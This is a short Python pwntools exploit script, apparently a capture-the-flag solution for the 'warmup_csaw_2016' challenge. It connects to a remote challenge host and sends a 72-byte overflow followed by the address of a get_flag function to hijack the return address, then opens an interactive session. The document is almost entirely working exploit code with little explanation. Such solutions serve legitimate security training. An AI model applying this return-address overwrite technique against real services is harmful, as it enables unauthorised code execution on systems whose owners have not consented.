...
target: str = './warmup_csaw_2016'
# elf = ELF(target) # load target and show its checksum
# r = Util.start_process(target)
r = remote('redirect.do-not-trust.hacking.run', 10194)
addr_get_flag = 0x040060D
input_len = 64
padding_len = 8
# I -> you : 1char to 3char : I * 20 + AAAA = 64
sa(b'>', (use_randoms(input_len+padding_len)) + p64(addr_get_flag))
# sl('ls')
r.interactive()
sys.exit(0)
